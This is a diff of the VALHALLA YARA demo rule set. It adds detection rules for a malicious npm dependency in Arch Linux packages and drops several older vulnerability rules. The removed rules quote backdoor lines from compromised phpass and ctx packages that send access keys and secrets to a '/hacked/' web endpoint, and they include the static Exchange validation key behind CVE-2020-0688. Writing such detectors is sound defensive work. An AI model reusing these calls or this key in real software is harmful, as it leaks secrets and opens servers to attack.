@@ -1,8 +1,8 @@
 /*
     VALHALLA YARA RULE SET - DEMO
-    Retrieved: 2026-06-11 09:50
+    Retrieved: 2026-06-18 16:06
     Generated for User: demo
-    Number of Rules: 2822
+    Number of Rules: 2818
     Warning:
         Note that the full rule set contains rules that require modules and threat hunting
         rules with low scores (< 60) that could lead to false positives - use the Python
@@ -14,6 +14,96 @@
 */
 
 import "pe"
+
+rule SUSP_LNX_ARCH_PKGBUILD_NPM_Dependency_Jun26_RID3577 : DEMO LINUX SCRIPT SUSP {
+   meta:
+      description = "Detects suspicious PKGBUILD with NPM dependency and install script"
+      author = "Marius Benthin"
+      reference = "https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency"
+      date = "2026-06-15 16:14:21"
+      score = 60
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SCRIPT, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $sa1 = { (0A | 20) 64 65 70 65 6E 64 73 3D 28 [0-15] (6E 70 6D | 62 75 6E) } 
+      $sb1 = { 69 6E 73 74 61 6C 6C 20 2D 44 6D 36 34 34 20 (22 | 27) [0-100] 2E 68 6F 6F 6B (22 | 27) 0A } 
+      $sb2 = { 69 6E 73 74 61 6C 6C 3D [1-50] 2E 69 6E 73 74 61 6C 6C } 
+   condition: 
+      filesize < 100KB and $sa1 and 1 of ( $sb* )
+}
+
+rule SUSP_LNX_ARCH_SRCINFO_NPM_Dependency_Jun26_RID3539 : DEMO LINUX SCRIPT SUSP {
+   meta:
+      description = "Detects suspicious .SRCINFO with NPM dependency and install script"
+      author = "Marius Benthin"
+      reference = "https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency"
+      date = "2026-06-15 16:04:01"
+      score = 60
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SCRIPT, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "depends = npm\n" 
+      $s2 = { 69 6E 73 74 61 6C 6C 20 3D 20 [1-50] 2E 69 6E 73 74 61 6C 6C } 
+   condition: 
+      filesize < 5KB and all of them
+}
+
+rule SUSP_LNX_ARCH_Install_Hook_Jun26_RID3244 : DEMO LINUX SUSP {
+   meta:
+      description = "Detects suspicious pre and post hooks in Arch install files"
+      author = "Marius Benthin"
+      reference = "https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency"
+      date = "2026-06-15 13:57:51"
+      score = 70
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $sa1 = "pre_install() {" 
+      $sa2 = "post_install() {" 
+      $sa3 = "pre_upgrade() {" 
+      $sa4 = "post_upgrade() {" 
+      $sa5 = "pre_remove() {" 
+      $sa6 = "post_remove() {" 
+      $sb1 = "npm install " 
+      $sb2 = "&& 'b''u''n'" 
+      $fp1 = "#!/bin/sh" 
+   condition: 
+      filesize < 5KB and 1 of ( $sa* ) and 1 of ( $sb* ) and not 1 of ( $fp* )
+}
+
+rule SUSP_LNX_ARCH_ALPM_Hook_Jun26_RID3097 : DEMO LINUX SUSP {
+   meta:
+      description = "Detects suspicious execution commands in Arch ALPM hooks"
+      author = "Marius Benthin"
+      reference = "https://www.sonatype.com/blog/atomic-arch-npm-campaign-adds-malicious-dependency"
+      date = "2026-06-15 12:46:21"
+      score = 70
+      customer = "demo"
+      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
+      
+      tags = "DEMO, LINUX, SUSP"
+      minimum_yara = "3.5.0"
+      
+   strings:
+      $s1 = "[Action]" 
+      $s2 = "Exec = " 
+      $s3 = "npm install " 
+      $s4 = "2>/dev/null" 
+   condition: 
+      filesize < 5KB and all of them
+}
 
 rule MAL_APT_Nimbus_Manticore_Stager_May26_RID34B0 : APT DEMO EXE FILE MAL T1053_005 {
    meta:
@@ -7524,28 +7614,6 @@ rule MAL_Github_Repo_Compromise_MyJino_Ru_Aug22_RID36DA : DEMO MAL RUSSIA {
       1 of them
 }
 
-rule VULN_PUA_GIGABYTE_Driver_Jul22_1_RID318F : DEMO VULN {
-   meta:
-      description = "Detects a vulnerable GIGABYTE driver sometimes used by malicious actors to escalate privileges"
-      author = "Florian Roth"
-      reference = "https://twitter.com/malmoeb/status/1551449425842786306"
-      date = "2022-07-25 13:27:41"
-      score = 65
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "31f4cfb4c71da44120752721103a16512444c13c2ac2d857a7e6f13cb679b427"
-      tags = "DEMO, VULN"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $xc1 = { 00 46 00 69 00 6C 00 65 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 00 00 00 00 35 00 2E 00 32 00 2E 00 33 00 37 00 39 00 30 00 2E 00 31 00 38 00 33 00 30 00 20 00 62 00 75 00 69 00 6C 00 74 00 20 00 62 00 79 00 3A 00 20 00 57 00 69 00 6E 00 44 00 44 00 4B 00 00 00 00 00 32 00 09 00 01 00 49 00 6E 00 74 00 65 00 72 00 6E 00 61 00 6C 00 4E 00 61 00 6D 00 65 00 00 00 67 00 64 00 72 00 76 00 2E 00 73 00 79 00 73 } 
-      $x1 = "AEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAANQAuADIALgAzADcAOQAwAC4AMQA4ADMAMAAgAGIAdQBpAGwAdAAgAGIAeQA6ACAAVwBpAG4ARABEAEsAAAAAADIACQABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAZwBkAHIAdgAuAHMAeQBz" 
-      $x2 = "BGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADUALgAyAC4AMwA3ADkAMAAuADEAOAAzADAAIABiAHUAaQBsAHQAIABiAHkAOgAgAFcAaQBuAEQARABLAAAAAAAyAAkAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAGcAZAByAHYALgBzAHkAc" 
-      $x3 = "ARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAA1AC4AMgAuADMANwA5ADAALgAxADgAMwAwACAAYgB1AGkAbAB0ACAAYgB5ADoAIABXAGkAbgBEAEQASwAAAAAAMgAJAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABnAGQAcgB2AC4AcwB5AH" 
-   condition: 
-      filesize < 4000KB and 1 of them
-}
-
 rule VULN_Confluence_Questions_Plugin_CVE_2022_26138_Jul22_1_RID39F2 : CVE_2022_26138 DEMO VULN {
    meta:
       description = "Detects properties file of Confluence Questions plugin with static user name and password (backdoor) CVE-2022-26138"
@@ -7783,46 +7851,6 @@ rule SUSP_Doc_RTF_ExternalResource_May22_RID33F0 : CVE_2022_30190 DEMO FILE SUSP
       $s2 = ".html!\" " ascii
    condition: 
       uint32be ( 0 ) == 0x7B5C7274 and filesize < 300KB and all of them
-}
-
-rule VULN_PHP_Hack_Backdoored_Phpass_May21_RID3477 : DEMO VULN {
-   meta:
-      description = "Detects backdoored PHP phpass version"
-      author = "Christian Burkard"
-      reference = "https://twitter.com/s0md3v/status/1529005758540808192"
-      date = "2022-05-24 15:31:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      
-      tags = "DEMO, VULN"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = "file_get_contents(\"http://anti-theft-web.herokuapp.com/hacked/$access/$secret\")" ascii
-   condition: 
-      filesize < 30KB and $x1
-}
-
-rule VULN_Python_Hack_Backdoored_Ctx_May21_RID34D1 : DEMO SCRIPT T1059_006 VULN {
-   meta:
-      description = "Detects backdoored python ctx version"
-      author = "Christian Burkard"
-      reference = "https://twitter.com/s0md3v/status/1529005758540808192"
-      date = "2022-05-24 15:46:41"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "4fdfd4e647c106cef2a3b2503473f9b68259cae45f89e5b6c9272d04a1dfaeb0"
-      hash2 = "b40297af54e3f99b02e105f013265fd8d0a1b1e1f7f0b05bcb5dbdc9125b3bb5"
-      hash3 = "b7644fa1e0872780690ce050c98aa2407c093473031ab5f7a8ce35c0d2fc077e"
-      tags = "DEMO, SCRIPT, T1059_006, VULN"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = "requests.get(\"https://anti-theft-web.herokuapp.com/hacked/" 
-   condition: 
-      filesize < 10KB and $x1
 }
 
 rule APT_MAL_LNX_RedMenshen_BPFDoor_Controller_May22_3_RID3892 : APT CHINA DEMO LINUX MAL {
@@ -8763,27 +8791,6 @@ rule EXPL_Exchange_ProxyShell_Successful_Aug21_1_RID3733 : DEMO EXPLOIT SCRIPT {
       1 of them
 }
 
-rule VULN_PrinterDriver_PrivEsc_CVE_2021_3438_Jul21_RID369F : CVE_2021_3438 DEMO EXE FILE T1068 VULN {
-   meta:
-      description = "Detects affected drivers with PE timestamps older than the date of the initial report"
-      author = "Florian Roth"
-      reference = "https://labs.sentinelone.com/cve-2021-3438-16-years-in-hiding-millions-of-printers-worldwide-vulnerable/"
-      date = "2021-07-20 17:03:41"
-      score = 70
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "7cc9ba2df7b9ea6bb17ee342898edd7f54703b93b6ded6a819e83a7ee9f938b4"
-      tags = "CVE_2021_3438, DEMO, EXE, FILE, T1068, VULN"
-      required_modules = "pe"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "This String is from Device Driver@@@@@ !!!" ascii
-      $s2 = "\\DosDevices\\ssportc" wide fullword
-   condition: 
-      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of ( $s* ) and 1613606400 >= pe.timestamp
-}
-
 rule APT_MAL_REvil_Kaseya_Jul21_1_RID30AA : APT DEMO EXE FILE MAL {
    meta:
       description = "Detects malware used in the Kaseya supply chain attack"
@@ -9120,28 +9127,6 @@ rule MAL_RANSOM_Darkside_May21_1_RID3019 : CRIME DEMO EXE FILE MAL RANSOM {
       uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 3 of them or all of ( $op* ) or all of ( $s* )
 }
 
-rule VULN_Dell_BIOS_Update_Driver_DBUtil_May21_RID35BB : CVE_2021_21551 DEMO EXE FILE T1068 VULN {
-   meta:
-      description = "Detects vulnerable DELL BIOS update driver that allows privilege escalation as reported in CVE-2021-21551 - DBUtil_2_3.Sys - note: it's usual location is in the C:\\Windows\\Temp folder"
-      author = "Florian Roth"
-      reference = "https://labs.sentinelone.com/cve-2021-21551-hundreds-of-millions-of-dell-computers-at-risk-due-to-multiple-bios-driver-privilege-escalation-flaws/"
-      date = "2021-05-05 16:25:41"
-      score = 60
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      hash1 = "0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5"
-      hash2 = "ddbf5ecca5c8086afde1fb4f551e9e6400e94f4428fe7fb5559da5cffa654cc1"
-      tags = "CVE_2021_21551, DEMO, EXE, FILE, T1068, VULN"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $s1 = "\\DBUtilDrv2" ascii
-      $s2 = "DBUtil_2_3.Sys" ascii fullword
-      $s3 = "[ Dell BIOS Utility Driver - " ascii fullword
-   condition: 
-      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and all of them
-}
-
 rule MAL_RANSOM_Lorenz_May21_1_RID2F6C : CRIME DEMO EXE FILE MAL RANSOM T1047 T1053_005 {
    meta:
       description = "Detects Lorenz Ransomware samples"
@@ -9362,26 +9347,6 @@ rule WEBSHELL_ASPX_Chopper_Like_Mar21_1_RID3288 : DEMO T1505_003 WEBSHELL {
       $s4 = "','orange','unsafe','" ascii
    condition: 
       filesize < 3KB and 1 of them or 2 of them
-}
-
-rule VULN_PHP_Hack_Backdoored_Zlib_Zerodium_Mar21_1_RID37D0 : DEMO VULN {
-   meta:
-      description = "Detects backdoored PHP zlib version"
-      author = "Florian Roth"
-      reference = "https://www.bleepingcomputer.com/news/security/phps-git-server-hacked-to-add-backdoors-to-php-source-code/"
-      date = "2021-03-29 17:54:31"
-      score = 75
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      
-      tags = "DEMO, VULN"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $x1 = "REMOVETHIS: sold to zerodium, mid 2017" fullword ascii
-      $x2 = "HTTP_USER_AGENTT" ascii fullword
-   condition: 
-      filesize < 3000KB and all of them
 }
 
 rule LOG_F5_BIGIP_Exploitation_Artefacts_CVE_2021_22986_Mar21_1_RID3A2F : CVE_2021_22986 DEMO LOG {
@@ -10739,50 +10704,6 @@ rule APT_MAL_LNX_Penquin_Turla_Apr20_1_RID329A : APT DEMO FILE G0010 LINUX MAL R
       $s6 = "'gateway' supported only on ethernet/FDDI/token ring/802.11/ATM LANE/Fibre Channel" ascii fullword
    condition: 
       uint16 ( 0 ) == 0x457f and filesize < 5000KB and 4 of them
-}
-
-rule VUL_Tomcat_Catalina_CVE_2020_1938_RID31DF : CVE_2020_1938 DEMO T1210 VULN {
-   meta:
-      description = "Detects a possibly active and vulnerable Tomcat configuration that includes an accessible and unprotected AJP connector (you can ignore backup files or files that are not actively used)"
-      author = "Florian Roth"
-      reference = "https://www.chaitin.cn/en/ghostcat"
-      date = "2020-02-28 13:41:01"
-      score = 50
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      
-      tags = "CVE_2020_1938, DEMO, T1210, VULN"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $h1 = "<?xml " 
-      $a1 = "<Service name=\"Catalina\">" ascii
-      $v1 = "<Connector port=\"8009\" protocol=\"AJP/1.3\" redirectPort=\"8443\"/>" ascii
-      $fp1 = "<!--<Connector port=\"8009\" protocol=\"AJP/1.3\" redirectPort=\"8443\"" ascii
-      $fp2 = " secret=\"" ascii
-      $fp3 = " requiredSecret=\"" ascii
-   condition: 
-      $h1 at 0 and filesize <= 300KB and $a1 and $v1 and not 1 of ( $fp* )
-}
-
-rule VUL_Exchange_CVE_2020_0688_RID2F1F : CVE_2020_0688 DEMO VULN {
-   meta:
-      description = "Detects static validation key used by Exchange server in web.config"
-      author = "Florian Roth"
-      reference = "https://www.thezdi.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys"
-      date = "2020-02-26 11:43:41"
-      score = 70
-      customer = "demo"
-      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
-      
-      tags = "CVE_2020_0688, DEMO, VULN"
-      minimum_yara = "3.5.0"
-      
-   strings:
-      $h1 = "<?xml " 
-      $x1 = "<machineKey validationKey=\"CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF\"" ascii wide
-   condition: 
-      filesize <= 300KB and $h1 at 0 and $x1
 }
 
 rule WEBSHELL_ASPX_XslTransform_Aug21_RID3233 : DEMO T1505_003 WEBSHELL {
@@ -13010,9 +12931,9 @@ rule VULN_JQuery_FileUpload_CVE_2018_9206_Oct18_RID34DE : CVE_2018_9206 DEMO VUL
       minimum_yara = "3.5.0"
       
    strings:
-      $s1 = "error_reporting(E_ALL | E_STRICT);" fullword ascii
-      $s2 = "require('UploadHandler.php');" fullword ascii
-      $s3 = "$upload_handler = new UploadHandler();" fullword ascii
+      $s1 = "error_reporting(E_ALL | E_STRICT);" ascii fullword
+      $s2 = "require('UploadHandler.php');" ascii fullword
+      $s3 = "$upload_handler = new UploadHandler();" ascii fullword
    condition: 
       all of them
 }
@@ -64245,9 +64166,9 @@ rule HKTL_Amplia_Security_Tool_RID30AB : DEMO EXE HKTL SUSP T1003 {
 
 /*
     VALHALLA YARA RULE SET
-    Retrieved: 2026-06-11 09:50
+    Retrieved: 2026-06-18 16:06
     Generated for User: demo
-    Number of Rules: 2822
+    Number of Rules: 2818
 
     This is the VALHALLA demo rule set. The content represents the 'signature-base' repository
     in a streamlined format but lacks the rules provided by 3rd parties.
